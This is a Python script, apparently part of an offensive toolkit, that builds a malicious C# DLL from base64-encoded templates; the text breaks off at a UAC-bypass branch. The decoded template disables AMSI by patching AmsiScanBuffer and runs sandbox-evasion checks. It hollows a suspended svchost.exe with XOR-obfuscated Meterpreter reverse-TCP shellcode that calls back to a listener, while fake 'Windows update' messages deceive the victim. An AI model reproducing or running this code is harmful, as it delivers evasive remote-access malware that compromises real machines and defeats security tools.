import os
import base64
import argparse
from makerunner import gen,runner,cradleps1,powershell_b64encode
from makehtml import copy
from makefodhelper import chararray

#lhost = "192.168.135.7" #"10.14.14.21"
#lport = "443"
#bitness = "64" #"32" #"64"
stage_encoding = "1" #"0" #"1"

custom_agent = "1" #"0" #"1" #will make cradle pretty long - makes defender suspicious
#agent_string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38"
agent_string = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"

proxy_kill = "0" #"0" #"1" #cannot coexist with proxy_steal, leave "0" by default since normal user will already use proxy
proxy_steal = "0" #"0" #"1" #only use when in SYSTEM powershell shell

dllwebroot = "/var/www/html/"
dllfilename = "ClassLibrary1.dll"

csfilepath = "/home/kali/data/ClassLibrary1/ClassLibrary1/"
csfilename = "Class1.cs"

# proxy-safe - if both "1", choose proxy_kill
if proxy_kill == "1" and proxy_steal == "1":
    proxy_steal = "0"
if proxy_kill == "1":
    proxy_steal = "0"
if proxy_steal == "1":
    proxy_kill = "0"

def bxor(b1, b2):
    res = bytes([_a ^ _b for _a, _b in zip(b1, b2)])
    res = "{:02x}".format(ord(res))
    res = "0x" + res
    return res

def xor_buffer_csharp(bufferstring):
    m = bufferstring.split("{")
    mheader = "byte[] buf = new byte[%s] {\n "
    mpayload = m[1].split("}")[0]
    mtail = " };\n"
    #print (mheader)
    #print (mpayload)
    mbytes = mpayload.split(',')
    mbytes = [x.strip() for x in mbytes]
    #print (mbytes)
    mres = []
    xorkey = bytes.fromhex("fa")
    count = 1
    for byte in mbytes:
        #print (byte)
        tmp = byte[2:]
        #print (tmp)
        if len(tmp) == 1:
            tmp = "0" + tmp
        #print (tmp)
        tmp = bytes.fromhex(tmp)
        res = bxor(tmp,xorkey)
        #print(res)
        if count == 15:
            res = res + ",\n" #.decode('iso8859-1') #.encode('ASCII') #'latin1'
            count = 1
        else:
            res = res + ","
        count += 1
        mres.append(res)
    msfres = " ".join(mres)
    buflen = len(mres)
    mheader = mheader % str(buflen)
    msfres = mheader + msfres[:-1] + mtail#'''
    #print (msfres)
    return msfres
    pass

def writedll(lhost,lport,bitness,uacbypass):
    if uacbypass == "0":
        upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnVzaW5nIFN5c3RlbS5OZXQ7CnVzaW5nIFN5c3RlbS5JTzsKdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOwoKbmFtZXNwYWNlIENsYXNzTGlicmFyeTEKewogICAgcHVibGljIGNsYXNzIENsYXNzMQogICAgewogICAgICAgIHB1YmxpYyBjb25zdCB1aW50IENSRUFURV9TVVNQRU5ERUQgPSAweDQ7CiAgICAgICAgcHVibGljIGNvbnN0IGludCBQUk9DRVNTQkFTSUNJTkZPUk1BVElPTiA9IDA7CgogICAgICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0KICAgICAgICBwdWJsaWMgc3RydWN0IFByb2Nlc3NJbmZvCiAgICAgICAgewogICAgICAgICAgICBwdWJsaWMgSW50UHRyIGhQcm9jZXNzOwogICAgICAgICAgICBwdWJsaWMgSW50UHRyIGhUaHJlYWQ7CiAgICAgICAgICAgIHB1YmxpYyBJbnQzMiBQcm9jZXNzSWQ7CiAgICAgICAgICAgIHB1YmxpYyBJbnQzMiBUaHJlYWRJZDsKICAgICAgICB9CgogICAgICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0KICAgICAgICBwdWJsaWMgc3RydWN0IFN0YXJ0dXBJbmZvCiAgICAgICAgewogICAgICAgICAgICBwdWJsaWMgdWludCBjYjsKICAgICAgICAgICAgcHVibGljIHN0cmluZyBscFJlc2VydmVkOwogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGxwRGVza3RvcDsKICAgICAgICAgICAgcHVibGljIHN0cmluZyBscFRpdGxlOwogICAgICAgICAgICBwdWJsaWMgdWludCBkd1g7CiAgICAgICAgICAgIHB1YmxpYyB1aW50IGR3WTsKICAgICAgICAgICAgcHVibGljIHVpbnQgZHdYU2l6ZTsKICAgICAgICAgICAgcHVibGljIHVpbnQgZHdZU2l6ZTsKICAgICAgICAgICAgcHVibGljIHVpbnQgZHdYQ291bnRDaGFyczsKICAgICAgICAgICAgcHVibGljIHVpbnQgZHdZQ291bnRDaGFyczsKICAgICAgICAgICAgcHVibGljIHVpbnQgZHdGaWxsQXR0cmlidXRlOwogICAgICAgICAgICBwdWJsaWMgdWludCBkd0ZsYWdzOwogICAgICAgICAgICBwdWJsaWMgc2hvcnQgd1Nob3dXaW5kb3c7CiAgICAgICAgICAgIHB1YmxpYyBzaG9ydCBjYlJlc2VydmVkMjsKICAgICAgICAgICAgcHVibGljIEludFB0ciBscFJlc2VydmVkMjsKICAgICAgICAgICAgcHVibGljIEludFB0ciBoU3RkSW5wdXQ7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZE91dHB1dDsKICAgICAgICAgICAgcHVibGljIEludFB0ciBoU3RkRXJyb3I7CiAgICAgICAgfQoKICAgICAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICAgICAgaW50ZXJuYWwgc3RydWN0IFByb2Nlc3NCYXNpY0luZm8KICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgUmVzZXJ2ZWQxOwogICAgICAgICAgICBwdWJsaWMgSW50UHRyIFBlYkFkZHJlc3M7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgUmVzZXJ2ZWQyOwogICAgICAgICAgICBwdWJsaWMgSW50UHRyIFJlc2VydmVkMzsKICAgICAgICAgICAgcHVibGljIEludFB0ciBVbmlxdWVQaWQ7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgTW9yZVJlc2VydmVkOwogICAgICAgIH0KCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICAgICAgc3RhdGljIGV4dGVybiB2b2lkIFNsZWVwKHVpbnQgZHdNaWxsaXNlY29uZHMpOwoKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gQ2hhclNldC5BbnNpKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIGJvb2wgQ3JlYXRlUHJvY2VzcyhzdHJpbmcgbHBBcHBsaWNhdGlvbk5hbWUsIHN0cmluZyBscENvbW1hbmRMaW5lLCBJbnRQdHIgbHBQcm9jZXNzQXR0cmlidXRlcywKICAgICAgICAgICAgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgYm9vbCBiSW5oZXJpdEhhbmRsZXMsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBFbnZpcm9ubWVudCwgc3RyaW5nIGxwQ3VycmVudERpcmVjdG9yeSwKICAgICAgICAgICAgW0luXSByZWYgU3RhcnR1cEluZm8gbHBTdGFydHVwSW5mbywgb3V0IFByb2Nlc3NJbmZvIGxwUHJvY2Vzc0luZm9ybWF0aW9uKTsKCiAgICAgICAgW0RsbEltcG9ydCgibnRkbGwuZGxsIiwgQ2FsbGluZ0NvbnZlbnRpb24gPSBDYWxsaW5nQ29udmVudGlvbi5TdGRDYWxsKV0KICAgICAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IFp3UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MoSW50UHRyIGhQcm9jZXNzLCBpbnQgcHJvY0luZm9ybWF0aW9uQ2xhc3MsCiAgICAgICAgICAgIHJlZiBQcm9jZXNzQmFzaWNJbmZvIHByb2NJbmZvcm1hdGlvbiwgdWludCBQcm9jSW5mb0xlbiwgcmVmIHVpbnQgcmV0bGVuKTsKCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICAgICAgc3RhdGljIGV4dGVybiBib29sIFJlYWRQcm9jZXNzTWVtb3J5KEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwQmFzZUFkZHJlc3MsIFtPdXRdIGJ5dGVbXSBscEJ1ZmZlciwKICAgICAgICAgICAgaW50IGR3U2l6ZSwgb3V0IEludFB0ciBscE51bWJlck9mYnl0ZXNSVyk7CgogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgV3JpdGVQcm9jZXNzTWVtb3J5KEludFB0ciBoUHJvY2VzcywgSW50UHRyIGxwQmFzZUFkZHJlc3MsIGJ5dGVbXSBscEJ1ZmZlciwgSW50MzIgblNpemUsIG91dCBJbnRQdHIgbHBOdW1iZXJPZkJ5dGVzV3JpdHRlbik7CgogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgICAgIHN0YXRpYyBleHRlcm4gdWludCBSZXN1bWVUaHJlYWQoSW50UHRyIGhUaHJlYWQpOwoKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludDMyIGR3U2l6ZSwgVUludDMyIGZsTmV3UHJvdGVjdCwgb3V0IFVJbnQzMiBscGZsT2xkUHJvdGVjdCk7CiAgICAgICAgCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG5hbWUpOwogICAgICAgIAogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFByb2NBZGRyZXNzKEludFB0ciBoTW9kdWxlLCBzdHJpbmcgcHJvY05hbWUpOwoKICAgICAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBFeGFjdFNwZWxsaW5nID0gdHJ1ZSldCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvY0V4TnVtYShJbnRQdHIgaFByb2Nlc3MsIEludFB0ciBscEFkZHJlc3MsIHVpbnQgZHdTaXplLCBVSW50MzIgZmxBbGxvY2F0aW9uVHlwZSwgVUludDMyIGZsUHJvdGVjdCwgVUludDMyIG5uZFByZWZlcnJlZCk7CiAgICAgICAgCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEN1cnJlbnRQcm9jZXNzKCk7CgoKICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgcnVubmVyKCkKICAgICAgICB7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJXaW5kb3dzIHVwZGF0ZSBkb3dubG9hZCBjb21wbGV0ZS4gUHJlcGFyaW5nIHRvIGNvbmZpZ3VyZSBXaW5kb3dzLiBEbyBub3QgdHVybiBvZmYgeW91ciBjb21wdXRlci4iKTsKICAgICAgICAgICAgSW50UHRyIG1lbSA9IFZpcnR1YWxBbGxvY0V4TnVtYShHZXRDdXJyZW50UHJvY2VzcygpLCBJbnRQdHIuWmVybywgMHgxMDAwLCAweDMwMDAsIDB4NCwgMCk7CiAgICAgICAgICAgIGlmIChtZW0gPT0gbnVsbCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CgogICAgICAgICAgICBEYXRlVGltZSB0MSA9IERhdGVUaW1lLk5vdzsKICAgICAgICAgICAgU2xlZXAoMTAwMDApOwogICAgICAgICAgICBkb3VibGUgZGVsdGFUID0gRGF0ZVRpbWUuTm93LlN1YnRyYWN0KHQxKS5Ub3RhbFNlY29uZHM7CiAgICAgICAgICAgIGlmIChkZWx0YVQgPCA5LjUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy9hbnRpaGV1cjogY29udGFjdCBmYWtlIHVybCBhbmQgc2VlIGlmIHN0YXR1cyBhY3R1YWxseSByZXR1cm5lZCBvawogICAgICAgICAgICBzdHJpbmcgdXJsID0gImh0dHA6Ly93b2x0cmFtYXBsaGEuY29tIjsKICAgICAgICAgICAgLy9zdHJpbmcgdXJsID0gImh0dHBzOi8vZ29vZ2xlLmNvbSI7IC8vdGVzdAogICAgICAgICAgICAvLyBDcmVhdGVzIGFuIEh0dHBXZWJSZXF1ZXN0IGZvciB0aGUgc3BlY2lmaWVkIFVSTC4KICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIEh0dHBXZWJSZXF1ZXN0IG15SHR0cFdlYlJlcXVlc3QgPSAoSHR0cFdlYlJlcXVlc3QpV2ViUmVxdWVzdC5DcmVhdGUodXJsKTsKICAgICAgICAgICAgICAgIC8vIFNlbmRzIHRoZSBIdHRwV2ViUmVxdWVzdCBhbmQgd2FpdHMgZm9yIGEgcmVzcG9uc2UuCiAgICAgICAgICAgICAgICBIdHRwV2ViUmVzcG9uc2UgbXlIdHRwV2ViUmVzcG9uc2UgPSAoSHR0cFdlYlJlc3BvbnNlKW15SHR0cFdlYlJlcXVlc3QuR2V0UmVzcG9uc2UoKTsKICAgICAgICAgICAgICAgIGlmIChteUh0dHBXZWJSZXNwb25zZS5TdGF0dXNDb2RlID09IEh0dHBTdGF0dXNDb2RlLk9LKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIC8vIFJlbGVhc2VzIHRoZSByZXNvdXJjZXMgb2YgdGhlIHJlc3BvbnNlLgogICAgICAgICAgICAgICAgbXlIdHRwV2ViUmVzcG9uc2UuQ2xvc2UoKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiQ29uZmlndXJpbmcgV2luZG93cyB1cGRhdGUuLi4gRG8gbm90IHR1cm4gb2ZmIHlvdXIgY29tcHV0ZXIuIik7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC8vYW50aWhldXI6IGxvb3AgOTAwIG1pbGxpb24gdGltZXMgYW5kIHNlZSBpZiB0aGUgbG9vcCByZWFsbHkgaGFwcGVuZWQKICAgICAgICAgICAgaW50IGNvdW50ID0gMDsKICAgICAgICAgICAgaW50IG1heCA9IDkwMDAwMDAwMDsKICAgICAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBtYXg7IGkrKykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgY291bnQrKzsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoY291bnQgIT0gbWF4KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZ29nbygpOwogICAgICAgIH0KCiAgICAgICAgc3RhdGljIHZvaWQgZ29nbygpCiAgICAgICAgewogICAgICAgICAgICAvL3dyZWNrIG1pbWkKICAgICAgICAgICAgc3RyaW5nIG5hbWUxID0gImEiICsgIm1zaSIgKyAiLmRsbCI7CiAgICAgICAgICAgIHN0cmluZyBuYW1lMiA9ICJBIiArICJtc2kiICsgIlNjYW5CIiArICJ1ZmZlciI7CiAgICAgICAgICAgIEludFB0ciBUYXJnZXRETEwgPSBMb2FkTGlicmFyeShuYW1lMSk7CiAgICAgICAgICAgIEludFB0ciBNaW1pUHRyID0gR2V0UHJvY0FkZHJlc3MoVGFyZ2V0RExMLCBuYW1lMik7CiAgICAgICAgICAgIFVJbnQzMiBvbGRQcm90ZWN0ID0gMDsKICAgICAgICAgICAgQnl0ZVtdIGJ1ZmkgPSB7IDB4NDgsIDB4MzEsIDB4QzAgfTsKICAgICAgICAgICAgVmlydHVhbFByb3RlY3QoTWltaVB0ciwgMywgMHg0MCwgb3V0IG9sZFByb3RlY3QpOwogICAgICAgICAgICBNYXJzaGFsLkNvcHkoYnVmaSwgMCwgTWltaVB0ciwgYnVmaS5MZW5ndGgpOwogICAgICAgICAgICBWaXJ0dWFsUHJvdGVjdChNaW1pUHRyLCAzLCAweDIwLCBvdXQgb2xkUHJvdGVjdCk7CgogICAgICAgICAgICAvLyBtc2Z2ZW5vbSAtcCB3aW5kb3dzL3g2NC9tZXRlcnByZXRlci9yZXZlcnNlX3RjcCBMSE9TVD0xOTIuMTY4LjEzNS43IExQT1JUPTQ0MyBFWElURlVOQz10aHJlYWQgLWYgY3NoYXJwCiAgICAgICAgICAgIC8vIFhPUmVkIHdpdGgga2V5IDB4ZmE="
        lower = "ICAgICAgICAgICAgLy8gU3RhcnQgJ3N2Y2hvc3QuZXhlJyBpbiBhIHN1c3BlbmRlZCBzdGF0ZQogICAgICAgICAgICBTdGFydHVwSW5mbyBzSW5mbyA9IG5ldyBTdGFydHVwSW5mbygpOwogICAgICAgICAgICBQcm9jZXNzSW5mbyBwSW5mbyA9IG5ldyBQcm9jZXNzSW5mbygpOwogICAgICAgICAgICBib29sIGNSZXN1bHQgPSBDcmVhdGVQcm9jZXNzKG51bGwsICJjOlxcd2luZG93c1xcc3lzdGVtMzJcXHN2Y2hvc3QuZXhlIiwgSW50UHRyLlplcm8sIEludFB0ci5aZXJvLAogICAgICAgICAgICAgICAgZmFsc2UsIENSRUFURV9TVVNQRU5ERUQsIEludFB0ci5aZXJvLCBudWxsLCByZWYgc0luZm8sIG91dCBwSW5mbyk7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCQiU3RhcnRlZCAnc3ZjaG9zdC5leGUnIGluIGEgc3VzcGVuZGVkIHN0YXRlIHdpdGggUElEIHtwSW5mby5Qcm9jZXNzSWR9LiBTdWNjZXNzOiB7Y1Jlc3VsdH0uIik7CgogICAgICAgICAgICAvLyBHZXQgUHJvY2VzcyBFbnZpcm9ubWVudCBCbG9jayAoUEVCKSBtZW1vcnkgYWRkcmVzcyBvZiBzdXNwZW5kZWQgcHJvY2VzcyAob2Zmc2V0IDB4MTAgZnJvbSBiYXNlIGltYWdlKQogICAgICAgICAgICBQcm9jZXNzQmFzaWNJbmZvIHBiSW5mbyA9IG5ldyBQcm9jZXNzQmFzaWNJbmZvKCk7CiAgICAgICAgICAgIHVpbnQgcmV0TGVuID0gbmV3IHVpbnQoKTsKICAgICAgICAgICAgbG9uZyBxUmVzdWx0ID0gWndRdWVyeUluZm9ybWF0aW9uUHJvY2VzcyhwSW5mby5oUHJvY2VzcywgUFJPQ0VTU0JBU0lDSU5GT1JNQVRJT04sIHJlZiBwYkluZm8sICh1aW50KShJbnRQdHIuU2l6ZSAqIDYpLCByZWYgcmV0TGVuKTsKICAgICAgICAgICAgSW50UHRyIGJhc2VJbWFnZUFkZHIgPSAoSW50UHRyKSgoSW50NjQpcGJJbmZvLlBlYkFkZHJlc3MgKyAweDEwKTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJHb3QgcHJvY2VzcyBpbmZvcm1hdGlvbiBhbmQgbG9jYXRlZCBQRUIgYWRkcmVzcyBvZiBwcm9jZXNzIGF0IHsiMHgiICsgYmFzZUltYWdlQWRkci5Ub1N0cmluZygieCIpfS4gU3VjY2Vzczoge3FSZXN1bHQgPT0gMH0uIik7CgogICAgICAgICAgICAvLyBHZXQgZW50cnkgcG9pbnQgb2YgdGhlIGFjdHVhbCBwcm9jZXNzIGV4ZWN1dGFibGUKICAgICAgICAgICAgLy8gVGhpcyBvbmUgaXMgYSBiaXQgY29tcGxpY2F0ZWQsIGJlY2F1c2UgdGhpcyBhZGRyZXNzIGRpZmZlcnMgZm9yIGVhY2ggcHJvY2VzcyAoZHVlIHRvIEFkZHJlc3MgU3BhY2UgTGF5b3V0IFJhbmRvbWl6YXRpb24gKEFTTFIpKQogICAgICAgICAgICAvLyBGcm9tIHRoZSBQRUIgKGFkZHJlc3Mgd2UgZ290IGluIGxhc3QgY2FsbCksIHdlIGhhdmUgdG8gZG8gdGhlIGZvbGxvd2luZzoKICAgICAgICAgICAgLy8gMS4gUmVhZCBleGVjdXRhYmxlIGFkZHJlc3MgZnJvbSBmaXJzdCA4IGJ5dGVzIChJbnQ2NCwgb2Zmc2V0IDApIG9mIFBFQiBhbmQgcmVhZCBkYXRhIGNodW5rIGZvciBmdXJ0aGVyIHByb2Nlc3NpbmcKICAgICAgICAgICAgLy8gMi4gUmVhZCB0aGUgZmllbGQgJ2VfbGZhbmV3JywgNCBieXRlcyBhdCBvZmZzZXQgMHgzQyBmcm9tIGV4ZWN1dGFibGUgYWRkcmVzcyB0byBnZXQgdGhlIG9mZnNldCBmb3IgdGhlIFBFIGhlYWRlcgogICAgICAgICAgICAvLyAzLiBUYWtlIHRoZSBtZW1vcnkgYXQgdGhpcyBQRSBoZWFkZXIgYWRkIGFuIG9mZnNldCBvZiAweDI4IHRvIGdldCB0aGUgRW50cnlwb2ludCBSZWxhdGl2ZSBWaXJ0dWFsIEFkZHJlc3MgKFJWQSkgb2Zmc2V0CiAgICAgICAgICAgIC8vIDQuIFJlYWQgdGhlIHZhbHVlIGF0IHRoZSBSVkEgb2Zmc2V0IGFkZHJlc3MgdG8gZ2V0IHRoZSBvZmZzZXQgb2YgdGhlIGV4ZWN1dGFibGUgZW50cnlwb2ludCBmcm9tIHRoZSBleGVjdXRhYmxlIGFkZHJlc3MKICAgICAgICAgICAgLy8gNS4gR2V0IHRoZSBhYnNvbHV0ZSBhZGRyZXNzIG9mIHRoZSBlbnRyeXBvaW50IGJ5IGFkZGluZyB0aGlzIHZhbHVlIHRvIHRoZSBiYXNlIGV4ZWN1dGFibGUgYWRkcmVzcy4gU3VjY2VzcyEKCiAgICAgICAgICAgIC8vIDEuIFJlYWQgZXhlY3V0YWJsZSBhZGRyZXNzIGZyb20gZmlyc3QgOCBieXRlcyAoSW50NjQsIG9mZnNldCAwKSBvZiBQRUIgYW5kIHJlYWQgZGF0YSBjaHVuayBmb3IgZnVydGhlciBwcm9jZXNzaW5nCiAgICAgICAgICAgIGJ5dGVbXSBwcm9jQWRkciA9IG5ldyBieXRlWzB4OF07CiAgICAgICAgICAgIGJ5dGVbXSBkYXRhQnVmID0gbmV3IGJ5dGVbMHgyMDBdOwogICAgICAgICAgICBJbnRQdHIgYnl0ZXNSVyA9IG5ldyBJbnRQdHIoKTsKICAgICAgICAgICAgYm9vbCByZXN1bHQgPSBSZWFkUHJvY2Vzc01lbW9yeShwSW5mby5oUHJvY2VzcywgYmFzZUltYWdlQWRkciwgcHJvY0FkZHIsIHByb2NBZGRyLkxlbmd0aCwgb3V0IGJ5dGVzUlcpOwogICAgICAgICAgICBJbnRQdHIgZXhlY3V0YWJsZUFkZHJlc3MgPSAoSW50UHRyKUJpdENvbnZlcnRlci5Ub0ludDY0KHByb2NBZGRyLCAwKTsKICAgICAgICAgICAgcmVzdWx0ID0gUmVhZFByb2Nlc3NNZW1vcnkocEluZm8uaFByb2Nlc3MsIGV4ZWN1dGFibGVBZGRyZXNzLCBkYXRhQnVmLCBkYXRhQnVmLkxlbmd0aCwgb3V0IGJ5dGVzUlcpOwogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgkIkRFQlVHOiBFeGVjdXRhYmxlIGJhc2UgYWRkcmVzczogeyIweCIgKyBleGVjdXRhYmxlQWRkcmVzcy5Ub1N0cmluZygieCIpfS4iKTsKCiAgICAgICAgICAgIC8vIDIuIFJlYWQgdGhlIGZpZWxkICdlX2xmYW5ldycsIDQgYnl0ZXMgKFVJbnQzMikgYXQgb2Zmc2V0IDB4M0MgZnJvbSBleGVjdXRhYmxlIGFkZHJlc3MgdG8gZ2V0IHRoZSBvZmZzZXQgZm9yIHRoZSBQRSBoZWFkZXIKICAgICAgICAgICAgdWludCBlX2xmYW5ldyA9IEJpdENvbnZlcnRlci5Ub1VJbnQzMihkYXRhQnVmLCAweDNjKTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJERUJVRzogZV9sZmFuZXcgb2Zmc2V0OiB7IjB4IiArIGVfbGZhbmV3LlRvU3RyaW5nKCJ4Iil9LiIpOwoKICAgICAgICAgICAgLy8gMy4gVGFrZSB0aGUgbWVtb3J5IGF0IHRoaXMgUEUgaGVhZGVyIGFkZCBhbiBvZmZzZXQgb2YgMHgyOCB0byBnZXQgdGhlIEVudHJ5cG9pbnQgUmVsYXRpdmUgVmlydHVhbCBBZGRyZXNzIChSVkEpIG9mZnNldAogICAgICAgICAgICB1aW50IHJ2YU9mZnNldCA9IGVfbGZhbmV3ICsgMHgyODsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJERUJVRzogUlZBIG9mZnNldDogeyIweCIgKyBydmFPZmZzZXQuVG9TdHJpbmcoIngiKX0uIik7CgogICAgICAgICAgICAvLyA0LiBSZWFkIHRoZSA0IGJ5dGVzIChVSW50MzIpIGF0IHRoZSBSVkEgb2Zmc2V0IHRvIGdldCB0aGUgb2Zmc2V0IG9mIHRoZSBleGVjdXRhYmxlIGVudHJ5cG9pbnQgZnJvbSB0aGUgZXhlY3V0YWJsZSBhZGRyZXNzCiAgICAgICAgICAgIHVpbnQgcnZhID0gQml0Q29udmVydGVyLlRvVUludDMyKGRhdGFCdWYsIChpbnQpcnZhT2Zmc2V0KTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJERUJVRzogUlZBIHZhbHVlOiB7IjB4IiArIHJ2YS5Ub1N0cmluZygieCIpfS4iKTsKCiAgICAgICAgICAgIC8vIDUuIEdldCB0aGUgYWJzb2x1dGUgYWRkcmVzcyBvZiB0aGUgZW50cnlwb2ludCBieSBhZGRpbmcgdGhpcyB2YWx1ZSB0byB0aGUgYmFzZSBleGVjdXRhYmxlIGFkZHJlc3MuIFN1Y2Nlc3MhCiAgICAgICAgICAgIEludFB0ciBlbnRyeXBvaW50QWRkciA9IChJbnRQdHIpKChJbnQ2NClleGVjdXRhYmxlQWRkcmVzcyArIHJ2YSk7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCQiR290IGV4ZWN1dGFibGUgZW50cnlwb2ludCBhZGRyZXNzOiB7IjB4IiArIGVudHJ5cG9pbnRBZGRyLlRvU3RyaW5nKCJ4Iil9LiIpOwoKICAgICAgICAgICAgLy8gQ2Fycnlpbmcgb24sIGRlY29kZSB0aGUgWE9SIHBheWxvYWQKICAgICAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBidWYuTGVuZ3RoOyBpKyspCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGJ1ZltpXSA9IChieXRlKSgodWludClidWZbaV0gXiAweGZhKTsKICAgICAgICAgICAgfQogICAgICAgICAgICAvL0NvbnNvbGUuV3JpdGVMaW5lKCJYT1ItZGVjb2RlZCBwYXlsb2FkLiIpOwoKICAgICAgICAgICAgLy8gT3ZlcndyaXRlIHRoZSBtZW1vcnkgYXQgdGhlIGlkZW50aWZpZWQgYWRkcmVzcyB0byAnaGlqYWNrJyB0aGUgZW50cnlwb2ludCBvZiB0aGUgZXhlY3V0YWJsZQogICAgICAgICAgICByZXN1bHQgPSBXcml0ZVByb2Nlc3NNZW1vcnkocEluZm8uaFByb2Nlc3MsIGVudHJ5cG9pbnRBZGRyLCBidWYsIGJ1Zi5MZW5ndGgsIG91dCBieXRlc1JXKTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJPdmVyd3JvdGUgZW50cnlwb2ludCB3aXRoIHBheWxvYWQuIFN1Y2Nlc3M6IHtyZXN1bHR9LiIpOwoKICAgICAgICAgICAgLy8gUmVzdW1lIHRoZSB0aHJlYWQgdG8gdHJpZ2dlciBvdXIgcGF5bG9hZAogICAgICAgICAgICB1aW50IHJSZXN1bHQgPSBSZXN1bWVUaHJlYWQocEluZm8uaFRocmVhZCk7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCQiVHJpZ2dlcmVkIHBheWxvYWQuIFN1Y2Nlc3M6IHtyUmVzdWx0ID09IDF9LiBDaGVjayB5b3VyIGxpc3RlbmVyISIpOwogICAgICAgIH0KICAgIH0KfQ=="

        msffilename = "met%s.csharp" % (bitness)
        m = open(msffilename,'r')
        msf = m.read()
        m.close()
        msf = xor_buffer_csharp(msf) # 5/26 -defender
        #msf_b64 = base64.b64encode(msf).decode()

        with open(csfilename,'w') as f:
            upper = base64.b64decode(upper).decode()
            lower = base64.b64decode(lower).decode()
            f.write(upper + "\n")
            f.write("\t\t\t" + msf + "\n")
            f.write(lower)
        f.close()

        print('[+] dll cs written: %s' % csfilename)
        return csfilename

    if uacbypass == "1":
